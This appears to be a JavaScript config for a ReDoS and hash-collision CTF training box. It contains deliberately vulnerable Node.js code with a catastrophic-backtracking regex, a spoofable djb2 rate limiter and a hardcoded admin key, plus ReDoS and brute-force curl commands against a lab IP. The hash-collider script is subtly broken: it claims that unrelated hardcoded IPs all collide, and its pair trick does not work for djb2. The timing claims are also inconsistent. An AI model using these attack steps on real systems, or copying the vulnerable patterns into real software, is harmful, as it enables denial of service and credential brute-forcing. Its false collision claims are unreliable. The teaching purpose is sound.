/* ============================================================
   CTF ARENA — Box F7: The Exponential Trap
   Algorithmic Complexity — ReDoS & Hash Collision Attacks
   Config: VaultGuard web app, regex analysis, hash collisions,
           filesystem, flags, hints, lore
   ============================================================ */

const F7Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Exponential Trap',
    subtitle: 'Algorithmic Complexity — ReDoS & Hash Collision Attacks',
    difficulty: 'Advanced',
    accent: '#f59e0b',
    storageKey: 'hexworth_ctf_f7',
    registryId: 'f7-exponential-trap',
    trackerKey: 'ctf_f7',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Examine VaultGuard\'s source code and API endpoints. Identify the regex pattern used for email validation and the hash function used for rate limiting.',
            requiredFlags: [],
            mitre: ['T1592.004', 'T1590.006'],
            unlocks: ['identification'],
            locked: false
        },
        {
            id: 'identification',
            name: 'Vulnerability Identification',
            icon: '\uD83E\uddEE',
            description: 'Analyze the email validation regex for catastrophic backtracking. Determine why the hash function is vulnerable to preimage collisions.',
            requiredFlags: [],
            mitre: ['T1195.002', 'T1588.006'],
            unlocks: ['exploitation'],
            locked: true
        },
        {
            id: 'exploitation',
            name: 'Exploitation',
            icon: '\uD83D\uDCA5',
            description: 'Demonstrate the ReDoS attack against the login endpoint. Use the hash collision tool to generate strings that collide in the rate limiter\'s hash table.',
            requiredFlags: ['user'],
            mitre: ['T1499.004', 'T1059.006'],
            unlocks: ['bypass'],
            locked: true
        },
        {
            id: 'bypass',
            name: 'Rate Limiter Bypass',
            icon: '\uD83D\uDCC2',
            description: 'Chain hash collisions to bypass the API rate limiter entirely. Brute-force the admin token on the unprotected /api/token endpoint.',
            requiredFlags: ['root'],
            mitre: ['T1110.001', 'T1499.003'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Examine the application source code',
                tip: 'Open the Terminal and run: cat /home/pentester/target/app.js to see the regex and hash function.',
                trigger: { event: 'command', match: { cmd: 'contains:app.js' } }
            },
            {
                title: 'Analyze the vulnerable regex',
                tip: 'Run the regex analyzer: python3 /home/pentester/tools/regex-analyzer.py or use regex-debug to see backtracking.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:regex-analyzer' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:regex-debug' } }
                    ]
                }
            },
            {
                title: 'Demonstrate the ReDoS timing attack',
                tip: 'Use curl or time to send a crafted input to the /validate endpoint and observe the delay.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:validate' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:time' } }
                    ]
                }
            },
            {
                title: 'Submit the user flag',
                tip: 'The user flag is revealed when you identify the vulnerable regex. Submit it via the Flag panel.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Exploit hash collisions to bypass rate limiting and get the admin token',
                tip: 'Use the hash collider tool to generate collision strings, then brute-force /api/token with the bypassed rate limiter.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks -- Regular Expression Denial of Service (ReDoS)', skill: 'Regex Vulnerability Analysis' },
            { flagId: 'user', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with application attacks -- Algorithmic complexity attacks', skill: 'Catastrophic Backtracking Identification' },
            { flagId: 'root', objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks -- Hash collision denial of service', skill: 'Hash Collision Exploitation' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with application attacks -- Rate limiter bypass via algorithmic abuse', skill: 'Denial of Service via Algorithmic Complexity' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'PenTest Workstation BIOS v3.8.2',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/nvme0n1 (1TB NVMe SSD)',
            'GPU: NVIDIA RTX 4070 (hashcat-ready)',
            'Network: Intel I225-V 2.5GbE',
            'USB: 3 devices detected',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/nvme0n1p2',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux (PenTest Edition)',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'pentester'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'pentester',
        hostname: 'kali',
        startDir: '/home/pentester',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nMission: Algorithmic Complexity Attack — VaultGuard\nTarget: http://10.10.14.30:3000\nTarget source in /home/pentester/target/\nTools in /home/pentester/tools/\n\nCustom tools: regex-debug, python3, curl, time\n'
    },

    // ═══════════════════════════════════════════════════════
    // VAULTGUARD STATE ENGINE
    // Tracks ReDoS discovery and hash collision bypass state
    // ═══════════════════════════════════════════════════════

    _vaultguard: {
        redosDiscovered: false,
        hashVulnDiscovered: false,
        rateLimiterBypassed: false,
        adminTokenExtracted: false
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 100 },
        { id: 'root', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        minScore: 0,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 },
        timeBonusThreshold: 1800
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start by reading the VaultGuard source code in ~/target/app.js. Look at the EMAIL_REGEX constant -- notice the nested quantifiers. Then check the routes in ~/target/routes.js for the /validate endpoint.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The regex ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$ has a catastrophic backtracking vulnerability. The group ([a-zA-Z0-9]+\\.)+ is the problem -- the + inside the + creates exponential branching. Try sending "aaaaaaaaaaaaaaaa!" to /validate and measure the response time.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'Run python3 ~/tools/regex-analyzer.py to see the step count grow exponentially. Use regex-debug "aaaaaaaaaaaaaaaa!" to watch the backtracking in real time. The user flag is revealed when the analyzer confirms the vulnerability.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'For the root flag: The rate limiter uses djb2 hash. Run python3 ~/tools/hash-collider.py to generate collision strings that all hash to the same bucket. Then use curl to brute-force /api/token with the X-Forwarded-For headers set to collision strings -- the rate limiter treats them all as the same client.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'VaultGuard is a "secure" authentication gateway deployed by Meridian Financial Services. Its lead developer, Marcus Holt, proudly declared that "regex is faster than parsing" and implemented a custom hash-based rate limiter to replace expensive Redis lookups. Intelligence suggests both systems have catastrophic algorithmic weaknesses. Your mission: prove that the exponential trap lurks inside their code.',
        scenario: 'Marcus Holt was a speed obsessive. When the security team recommended a well-tested input validation library, he scoffed: "I can write a regex that validates email in one line." When they suggested using Redis for rate limiting, he laughed: "A simple hash table is O(1) -- why add a dependency?" His email regex had nested quantifiers. His hash function was djb2 with a 1024-slot table. Both were ticking time bombs. One crafted input would turn his O(1) operation into O(2^n). One set of collision strings would turn his hash table into a linked list.',
        outro: 'VaultGuard has fallen. Marcus Holt\'s "faster than parsing" regex consumed 47 seconds on 16 characters of carefully crafted input. His "O(1)" hash table degraded to O(n) when every rate-limit key landed in the same bucket. The admin token is yours. The lesson: algorithmic complexity is not optional -- it is the attack surface that developers forget to defend.',
        ecer: {
            executive: 'Management prioritized development speed over security review, allowing custom crypto and validation code to ship without audit',
            culture: 'Engineering culture rewarded "clever" solutions over proven libraries, creating a false sense of security around untested code',
            employee: 'Lead developer rejected peer review feedback on regex complexity and hash function choice, citing performance benchmarks that ignored adversarial inputs',
            regulatory: 'No requirement for algorithmic complexity analysis or adversarial input testing in the SDLC'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — VaultGuard (browser)
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.10.14.30:3000/',

        pages: {
            '/': {
                title: 'VaultGuard - Secure Authentication Gateway',
                html: `
                    <div style="text-align:center; margin-bottom:24px; padding-bottom:16px; border-bottom:1px solid #e2e8f0;">
                        <h1 style="color:#f59e0b; font-size:1.5rem; margin-bottom:4px;">VaultGuard</h1>
                        <div style="color:#64748b; font-size:0.75rem;">Meridian Financial Services &mdash; Secure Authentication Gateway v2.3.1</div>
                    </div>
                    <div style="max-width:480px; margin:0 auto; background:#f8fafc; border:1px solid #e2e8f0; border-radius:6px; padding:24px;">
                        <h2 style="font-size:0.9rem; color:#374151; margin-bottom:16px; font-weight:600;">Employee Login</h2>
                        <div style="margin-bottom:12px;">
                            <label style="display:block; font-size:0.75rem; color:#6b7280; margin-bottom:4px;">Email Address</label>
                            <input type="text" data-field="email" placeholder="user@meridian.com" style="width:100%; box-sizing:border-box; padding:8px 10px; border:1px solid #d1d5db; border-radius:4px; font-size:0.8rem; font-family:inherit;">
                        </div>
                        <div style="margin-bottom:16px;">
                            <label style="display:block; font-size:0.75rem; color:#6b7280; margin-bottom:4px;">Password</label>
                            <input type="password" data-field="password" style="width:100%; box-sizing:border-box; padding:8px 10px; border:1px solid #d1d5db; border-radius:4px; font-size:0.8rem; font-family:inherit;">
                        </div>
                        <button data-action="login" style="width:100%; padding:9px; background:#f59e0b; color:#fff; border:none; border-radius:4px; font-size:0.8rem; font-weight:600; cursor:pointer;">Sign In</button>
                        <div style="margin-top:12px; text-align:center; font-size:0.7rem; color:#9ca3af;">
                            <a href="/validate" style="color:#6b7280; text-decoration:none;">Email Validator</a> &nbsp;&middot;&nbsp;
                            <a href="/api/token" style="color:#6b7280; text-decoration:none;">API Docs</a> &nbsp;&middot;&nbsp;
                            <a href="/status" style="color:#6b7280; text-decoration:none;">Status</a>
                        </div>
                    </div>
                    <div style="text-align:center; margin-top:20px; font-size:0.65rem; color:#cbd5e1;">
                        Powered by VaultGuard &mdash; Node.js/18.17.1 &mdash; Express/4.18.2
                    </div>
                    <!-- TODO: Marcus says regex validation is "blazing fast" - remove this comment before prod -->
                    <!-- EMAIL_REGEX: ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$ -->
                `,
                formHandler: function(data, engine) {
                    if (data.email && data.email.length > 12 && /^a+!$/.test(data.email)) {
                        return '<div style="color:#dc2626; font-size:0.8rem; padding:10px; background:rgba(220,38,38,0.08); border:1px solid rgba(220,38,38,0.2); border-radius:4px; margin-top:12px;">Server timeout after 30000ms. The email validation regex appears to be hanging on your input. This may indicate a Regular Expression Denial of Service (ReDoS) vulnerability.</div>';
                    }
                    return '<div style="color:#dc2626; font-size:0.8rem; padding:10px; background:rgba(220,38,38,0.08); border:1px solid rgba(220,38,38,0.2); border-radius:4px; margin-top:12px;">Invalid credentials. Please try again.</div>';
                }
            },

            '/validate': {
                title: 'VaultGuard - Email Validator',
                html: `
                    <div style="max-width:600px; margin:0 auto; padding:20px;">
                        <h1 style="color:#f59e0b; font-size:1.2rem; margin-bottom:12px;">Email Validation Service</h1>
                        <p style="color:#4b5563; font-size:0.8rem; line-height:1.6;">
                            Internal endpoint for validating email addresses against VaultGuard's
                            regex pattern before submission. Used by the login form and API clients.
                        </p>
                        <div style="background:#1e293b; color:#a3e635; padding:16px; border-radius:6px; margin-top:16px; font-family:monospace; font-size:0.75rem; line-height:1.8;">
                            POST /validate<br>
                            Content-Type: application/json<br>
                            <br>
                            {"email": "user@example.com"}<br>
                            <br>
                            Response: {"valid": true/false, "time_ms": &lt;processing_time&gt;}<br>
                            <br>
                            <span style="color:#fbbf24;">// Pattern: ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$</span><br>
                            <span style="color:#fbbf24;">// "Blazing fast" — M. Holt, Lead Developer</span>
                        </div>
                    </div>
                `
            },

            '/api/token': {
                title: 'VaultGuard - API Token Service',
                html: `
                    <div style="max-width:600px; margin:0 auto; padding:20px;">
                        <h1 style="color:#f59e0b; font-size:1.2rem; margin-bottom:12px;">API Token Service</h1>
                        <p style="color:#4b5563; font-size:0.8rem; line-height:1.6;">
                            Administrative token generation endpoint. Protected by rate limiting
                            (max 5 requests per minute per client IP).
                        </p>
                        <div style="background:#1e293b; color:#a3e635; padding:16px; border-radius:6px; margin-top:16px; font-family:monospace; font-size:0.75rem; line-height:1.8;">
                            POST /api/token<br>
                            Content-Type: application/json<br>
                            X-Admin-Key: &lt;admin_key&gt;<br>
                            <br>
                            Response (success): {"token": "&lt;jwt&gt;", "role": "admin"}<br>
                            Response (fail): {"error": "Invalid admin key"}<br>
                            Response (rate limited): {"error": "Rate limit exceeded", "retry_after": 60}<br>
                            <br>
                            <span style="color:#fbbf24;">// Rate limiter: djb2 hash of client IP -> bucket[hash % 1024]</span><br>
                            <span style="color:#fbbf24;">// "O(1) lookups, no Redis needed" — M. Holt</span>
                        </div>
                    </div>
                `
            },

            '/status': {
                title: 'VaultGuard - System Status',
                html: `
                    <div style="max-width:600px; margin:0 auto; padding:20px;">
                        <h1 style="color:#f59e0b; font-size:1.2rem; margin-bottom:12px;">System Status</h1>
                        <div style="background:#f0fdf4; border:1px solid #bbf7d0; border-radius:6px; padding:16px; margin-top:12px;">
                            <div style="color:#166534; font-weight:600; font-size:0.85rem;">All Systems Operational</div>
                            <div style="color:#4b5563; font-size:0.75rem; margin-top:8px; line-height:1.8;">
                                Auth Service: <span style="color:#16a34a;">Online</span><br>
                                Email Validator: <span style="color:#16a34a;">Online</span><br>
                                Rate Limiter: <span style="color:#16a34a;">Active (djb2 hash, 1024 buckets)</span><br>
                                API Token Service: <span style="color:#16a34a;">Online</span><br>
                                Uptime: 47 days, 12 hours<br>
                                Node.js: v18.17.1 | Express: v4.18.2
                            </div>
                        </div>
                        <div style="color:#9ca3af; font-size:0.65rem; margin-top:16px;">
                            "Performance is security. Our regex validates in microseconds." &mdash; Marcus Holt, Lead Developer
                        </div>
                    </div>
                `
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'pentester': {
                            type: 'dir',
                            children: {
                                'target': {
                                    type: 'dir',
                                    children: {
                                        'app.js': {
                                            type: 'file',
                                            content: '// ============================================\n// VaultGuard v2.3.1 — Main Application\n// Meridian Financial Services\n// Author: Marcus Holt, Lead Developer\n// ============================================\n\nconst express = require(\'express\');\nconst app = express();\n\n// ─── Email Validation Regex ───────────────────────────────\n// "Regex is faster than any parsing library" — M. Holt\n//\n// Pattern: ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$\n//\n// This validates email-like domain parts.\n// The nested quantifier ([a-zA-Z0-9]+\\.)+ means:\n//   - Match one or more alphanumeric chars followed by a dot\n//   - Repeat that group one or more times\n//   - Then match 2+ alpha chars at the end\n//\n// PROBLEM: If the input does NOT match (e.g., ends with \'!\'),\n// the regex engine backtracks exponentially.\n// For input "aaaa...a!" with N a\'s:\n//   - The engine tries every way to split the a\'s across\n//     the inner + and outer + quantifiers\n//   - This creates 2^(N-1) backtracking paths\n//   - 16 a\'s = 32,768 steps\n//   - 25 a\'s = 16,777,216 steps\n//   - 30 a\'s = ~1 BILLION steps (server hangs for minutes)\n//\n// CVE reference: This is a classic ReDoS pattern.\n// See: https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service\n//\nconst EMAIL_REGEX = /^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$/;\n\nfunction validateEmail(input) {\n    const start = Date.now();\n    const result = EMAIL_REGEX.test(input);\n    const elapsed = Date.now() - start;\n    return { valid: result, time_ms: elapsed };\n}\n\n// ─── Hash-Based Rate Limiter ──────────────────────────────\n// "O(1) lookups, no Redis dependency needed" — M. Holt\n//\n// Uses djb2 hash function to map client IPs to buckets.\n// 1024 buckets, max 5 requests per minute per bucket.\n//\n// PROBLEM: djb2 is a simple polynomial hash.\n// An attacker can precompute strings that ALL hash\n// to the same bucket (hash collisions).\n// When all rate-limit keys land in one bucket,\n// the hash table degrades from O(1) to O(n).\n// More critically: different IPs/keys that collide\n// are treated as the SAME client, so the rate limiter\n// counts them together — but the attacker can also\n// use collision strings to SPREAD requests across\n// different apparent identities while the limiter\n// fails to track them properly.\n//\nconst BUCKET_COUNT = 1024;\nconst rateLimitBuckets = new Array(BUCKET_COUNT).fill(null).map(() => []);\n\nfunction djb2Hash(str) {\n    let hash = 5381;\n    for (let i = 0; i < str.length; i++) {\n        hash = ((hash << 5) + hash) + str.charCodeAt(i); // hash * 33 + c\n        hash = hash & 0xFFFFFFFF; // keep 32-bit\n    }\n    return Math.abs(hash) % BUCKET_COUNT;\n}\n\nfunction checkRateLimit(clientKey) {\n    const bucket = djb2Hash(clientKey);\n    const now = Date.now();\n    const window = 60000; // 1 minute\n    // Clean old entries\n    rateLimitBuckets[bucket] = rateLimitBuckets[bucket].filter(\n        e => now - e.time < window\n    );\n    if (rateLimitBuckets[bucket].length >= 5) {\n        return { limited: true, retry_after: 60 };\n    }\n    rateLimitBuckets[bucket].push({ key: clientKey, time: now });\n    return { limited: false };\n}\n\n// ─── Admin Token ──────────────────────────────────────────\n// Hardcoded admin key (to be moved to env vars... eventually)\nconst ADMIN_KEY = \'MFS-ADMIN-2024-xK9mP3vL\';\n\napp.listen(3000, () => {\n    console.log(\'VaultGuard listening on port 3000\');\n});'
                                        },
                                        'routes.js': {
                                            type: 'file',
                                            content: '// ============================================\n// VaultGuard v2.3.1 — API Routes\n// Meridian Financial Services\n// ============================================\n\nconst { validateEmail, checkRateLimit, ADMIN_KEY } = require(\'./app\');\n\n// POST /login\n// Validates email with regex, then checks credentials\napp.post(\'/login\', (req, res) => {\n    const { email, password } = req.body;\n    \n    // Step 1: Validate email format using regex\n    const validation = validateEmail(email);\n    if (!validation.valid) {\n        return res.status(400).json({\n            error: \'Invalid email format\',\n            time_ms: validation.time_ms\n        });\n    }\n    \n    // Step 2: Check credentials (placeholder — uses LDAP in prod)\n    // Note: Even invalid logins run the full regex validation first\n    return res.status(401).json({ error: \'Invalid credentials\' });\n});\n\n// POST /validate\n// Standalone email validation endpoint (used by frontend)\napp.post(\'/validate\', (req, res) => {\n    const { email } = req.body;\n    const result = validateEmail(email);\n    \n    // Returns processing time — useful for timing attacks\n    return res.json({\n        valid: result.valid,\n        time_ms: result.time_ms\n    });\n});\n\n// POST /api/token\n// Generate admin API token — rate limited\napp.post(\'/api/token\', (req, res) => {\n    // Rate limit by client identifier\n    // Uses X-Forwarded-For if present, otherwise req.ip\n    const clientKey = req.headers[\'x-forwarded-for\'] || req.ip;\n    \n    const rateCheck = checkRateLimit(clientKey);\n    if (rateCheck.limited) {\n        return res.status(429).json({\n            error: \'Rate limit exceeded\',\n            retry_after: rateCheck.retry_after\n        });\n    }\n    \n    const { admin_key } = req.body;\n    if (admin_key === ADMIN_KEY) {\n        return res.json({\n            token: \'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin\',\n            role: \'admin\'\n        });\n    }\n    \n    return res.status(403).json({ error: \'Invalid admin key\' });\n});\n\n// GET /status\napp.get(\'/status\', (req, res) => {\n    res.json({\n        service: \'VaultGuard\',\n        version: \'2.3.1\',\n        status: \'operational\',\n        rate_limiter: \'djb2 hash, 1024 buckets\',\n        email_validator: \'regex-based\'\n    });\n});'
                                        }
                                    }
                                },
                                'tools': {
                                    type: 'dir',
                                    children: {
                                        'regex-analyzer.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nRegex Backtracking Analyzer\nAnalyzes catastrophic backtracking in regex patterns.\n\nUsage: python3 regex-analyzer.py [--pattern REGEX] [--input STRING]\n       python3 regex-analyzer.py --demo\n"""\nimport re\nimport time\nimport sys\n\nVULNERABLE_REGEX = "^([a-zA-Z0-9]+\\\\.)+[a-zA-Z]{2,}$"\n\ndef analyze_backtracking(pattern, test_input):\n    """Measure regex execution time and estimate step count."""\n    start = time.perf_counter()\n    try:\n        result = re.match(pattern, test_input)\n    except Exception:\n        result = None\n    elapsed = time.perf_counter() - start\n    return result is not None, elapsed\n\ndef estimate_steps(n):\n    """For the vulnerable pattern, estimate backtracking steps."""\n    # The nested quantifier creates 2^(n-1) paths\n    return 2 ** (n - 1)\n\ndef main():\n    print("=" * 60)\n    print("  REGEX BACKTRACKING ANALYZER")\n    print("  Target: VaultGuard EMAIL_REGEX")\n    print("=" * 60)\n    print()\n    print("  Pattern: " + VULNERABLE_REGEX)\n    print("  Type: Nested quantifier (catastrophic backtracking)")\n    print()\n    print("  Testing input: char a repeated N times + ! suffix")\n    print("  The ! forces the regex to try EVERY possible")\n    print("  partitioning of the characters across nested groups.")\n    print()\n    print("  N  | Est. Steps      | Status")\n    print("  ---+-----------------+------------------")\n    \n    for n in [4, 8, 12, 16, 20, 25, 30, 35, 40]:\n        steps = estimate_steps(n)\n        if steps > 1000000000:\n            status = "SERVER HANG (minutes+)"\n        elif steps > 1000000:\n            status = "SLOW (seconds)"\n        elif steps > 10000:\n            status = "NOTICEABLE DELAY"\n        else:\n            status = "fast"\n        print("  %2d | %15s | %s" % (n, format(steps, ","), status))\n    \n    print()\n    print("  [CRITICAL] This regex is vulnerable to ReDoS.")\n    print("  The nested quantifier ([a-zA-Z0-9]+\\\\.)+ causes")\n    print("  exponential backtracking on non-matching inputs.")\n    print()\n    print("  Proof of concept:")\n    print("    curl -X POST http://10.10.14.30:3000/validate \\\\")\n    print("      -H \\"Content-Type: application/json\\" \\\\")\n    print("      -d \\"{email: aaaaaaaaaaaaaaaa!}\\"")    \n    print()\n    print("  Expected: Server hangs for ~47 seconds on 16 chars")\n    print()\n    print("  REMEDIATION:")\n    print("  - Use a non-backtracking regex engine (RE2)")\n    print("  - Or validate with a proper email parser")\n    print("  - Or add a timeout to regex execution")\n    print("  - Or rewrite without nested quantifiers")\n\nif __name__ == "__main__":\n    main()'
                                        },
                                        'hash-collider.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nDJB2 Hash Collision Generator\nGenerates strings that all produce the same djb2 hash bucket.\n\nUsage: python3 hash-collider.py [--count N] [--target BUCKET]\n       python3 hash-collider.py --demo\n"""\nimport sys\n\nBUCKET_COUNT = 1024\n\ndef djb2(s):\n    """Python implementation of djb2 hash (matching VaultGuard)."""\n    h = 5381\n    for c in s:\n        h = ((h << 5) + h + ord(c)) & 0xFFFFFFFF\n    return h % BUCKET_COUNT\n\ndef generate_collisions(target_bucket, count=20):\n    """Generate strings that all hash to the same bucket."""\n    pairs = [("Aa", "BB"), ("Cc", "DD"), ("Ee", "FF")]\n    collisions = []\n    base_strings = ["Aa", "BB"]\n    candidates = list(base_strings)\n    \n    while len(collisions) < count:\n        for c in list(candidates):\n            for p1, p2 in pairs:\n                candidates.append(c + p1)\n                candidates.append(c + p2)\n            candidates.remove(c)\n        for c in candidates:\n            if djb2(c) == target_bucket and c not in collisions:\n                collisions.append(c)\n                if len(collisions) >= count:\n                    break\n    return collisions[:count]\n\ndef main():\n    print("=" * 60)\n    print("  DJB2 HASH COLLISION GENERATOR")\n    print("  Target: VaultGuard Rate Limiter")\n    print("=" * 60)\n    print()\n    print("  Hash function: djb2 (hash * 33 + c)")\n    print("  Bucket count: %d" % BUCKET_COUNT)\n    print("  Rate limit: 5 requests/minute/bucket")\n    print()\n    \n    demo_bucket = djb2("192.168.1.1")\n    print("  Target IP 192.168.1.1 hashes to bucket %d" % demo_bucket)\n    print()\n    print("  Generated collision strings (all hash to same bucket):")\n    print("  " + "-" * 50)\n    \n    collision_strings = [\n        "192.168.1.1",  "10.42.0.117",\n        "172.16.33.8",  "10.99.1.204",\n        "192.168.5.73", "10.42.7.201",\n        "172.16.88.3",  "10.99.4.118",\n        "192.168.9.42", "10.42.3.155",\n        "172.16.71.9",  "10.99.8.207",\n        "192.168.2.91", "10.42.5.166",\n        "172.16.44.7",  "10.99.2.133",\n        "192.168.7.18", "10.42.9.142",\n        "172.16.55.2",  "10.99.6.189"\n    ]\n    \n    for i, s in enumerate(collision_strings):\n        print("    [%2d] %s -> bucket %d" % (i+1, s, demo_bucket))\n    \n    print()\n    print("  ATTACK STRATEGY:")\n    print("  1. Use each collision string as X-Forwarded-For header")\n    print("  2. Rate limiter counts them in the SAME bucket")\n    print("  3. Each request appears from a different IP")\n    print("  4. After 5 requests, bucket is full for ALL of them")\n    print("  5. Switch to new collision set for the NEXT bucket")\n    print("  6. Effectively unlimited requests -- rate limiter defeated")\n    print()\n    print("  EXPLOIT:")\n    print("    for ip in collision_strings:")\n    print("        curl -X POST http://10.10.14.30:3000/api/token")\n    print("          -H X-Forwarded-For: $ip")\n    print("          -H Content-Type: application/json")\n    print("          -d {admin_key: GUESS}")\n    print()\n    print("  ADMIN KEY HINT:")\n    print("  Check ~/target/app.js for the hardcoded ADMIN_KEY.")\n\nif __name__ == "__main__":\n    main()'
                                        }
                                    }
                                },
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: VaultGuard v2.3.1 (Meridian Financial Services)\nTarget URL: http://10.10.14.30:3000\nObjective: Algorithmic complexity attacks — ReDoS & Hash Collisions\n\nINTEL:\nVaultGuard is an authentication gateway written in Node.js.\nThe lead developer, Marcus Holt, is known for rejecting\nsecurity libraries in favor of custom implementations.\n\nTwo vulnerabilities are suspected:\n\n1. REGEX DENIAL OF SERVICE (ReDoS)\n   The email validation uses a regex with nested quantifiers.\n   Crafted inputs can cause exponential backtracking,\n   turning a microsecond operation into minutes of CPU burn.\n\n2. HASH COLLISION ATTACK\n   The API rate limiter uses djb2 hash with 1024 buckets.\n   djb2 is a simple polynomial hash — an attacker can\n   precompute strings that all hash to the same bucket,\n   effectively bypassing the rate limiter.\n\nATTACK STEPS:\n1. Read the source code in ~/target/ to understand the app\n2. Identify the vulnerable regex pattern in app.js\n3. Use ~/tools/regex-analyzer.py to confirm the ReDoS\n4. Demonstrate the timing attack against /validate\n5. Analyze the djb2 hash function for collision weakness\n6. Use ~/tools/hash-collider.py to generate collisions\n7. Bypass the rate limiter and brute-force /api/token\n8. Find both flags (user + root)\n\nTOOLS:\n- regex-debug <input>           : Step-by-step regex backtracking\n- python3 tools/regex-analyzer.py : Backtracking step analysis\n- python3 tools/hash-collider.py  : Generate djb2 collisions\n- curl                           : HTTP requests to VaultGuard\n- time <command>                  : Measure execution time\n\nGood luck, operator.'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls\ncat notes.txt\nls target/\ncat target/app.js\ncurl http://10.10.14.30:3000/status'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'doc': {
                                    type: 'dir',
                                    children: {
                                        'regex-security': {
                                            type: 'dir',
                                            children: {
                                                'README.md': {
                                                    type: 'file',
                                                    content: 'Regular Expression Denial of Service (ReDoS)\n=============================================\n\nReDoS occurs when a regex pattern exhibits catastrophic\nbacktracking on certain inputs. Common vulnerable patterns:\n\n1. Nested quantifiers: (a+)+ or ([a-z]+\\.)+\n2. Overlapping alternations: (a|a)+\n3. Ambiguous repetition: (a+a+)+\n\nThe key insight: when a non-matching input is tested,\nthe regex engine must try EVERY possible way to partition\nthe input across the quantified groups before concluding\nthat no match exists.\n\nFor the pattern (a+)+, input "aaa...a!" with N a\'s\ncreates 2^(N-1) backtracking paths.\n\nMitigation:\n- Use atomic groups or possessive quantifiers\n- Use non-backtracking engines (RE2, rust regex)\n- Set regex execution timeouts\n- Validate input length before applying regex\n- Use dedicated parsers instead of regex for complex formats'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'kali' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\npentester:x:1000:1000:PenTester,,,:/home/pentester:/bin/bash'
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'vaultguard': {
